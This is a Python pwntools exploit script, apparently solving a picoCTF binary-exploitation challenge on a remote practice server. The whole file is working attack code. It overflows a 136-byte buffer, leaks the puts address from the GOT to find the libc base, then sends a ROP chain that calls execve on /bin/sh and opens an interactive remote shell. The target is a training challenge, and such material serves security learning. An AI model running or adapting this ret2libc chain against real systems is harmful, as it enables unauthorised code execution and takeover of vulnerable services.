#!/bin/python3
from pwn import *


HOST = 'mercury.picoctf.net'
PORT = 24159

EXE  = './vuln'


# if args.EXPLOIT:
r = remote(HOST, PORT)
libc = ELF('./libc.so.6')
# else:
# r=process('./whereami')
# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

exe = ELF(EXE)
pop_rdi = 0x400913
ret=0x40052e
pop_rsi = 0x23e8a
pop_rdx = 0x1b96
offset  = libc.symbols['puts']



print(r.recvuntil('!\n'))
print("Sending payload1")
payload  = b'A'*136
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.symbols['main'])

r.sendline(payload)
print(r.recvline())
leak=r.recvline()[:-1]
leak=u64(leak+b'\x00\x00')
print(hex(leak))
print(r.recvuntil('!\n'))
print("Sending payload2")

# print(libc.address)
libc.address = leak - offset
binsh        = next(libc.search(b'/bin/sh\x00'))
system       = libc.symbols['system']
nullptr      = next(libc.search(b'\x00'*8))
execve       = libc.symbols['execve']

payload  = b'A'*136
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc.address+pop_rsi)
payload += p64(nullptr)
payload += p64(libc.address+pop_rdx)
payload += p64(nullptr)
payload += p64(execve)
# payload +=p64(binsh)
r.sendline(payload)
print(r.recvline())
# print(r.recvline())

# gdb.attach(r,"""""")
r.interactive()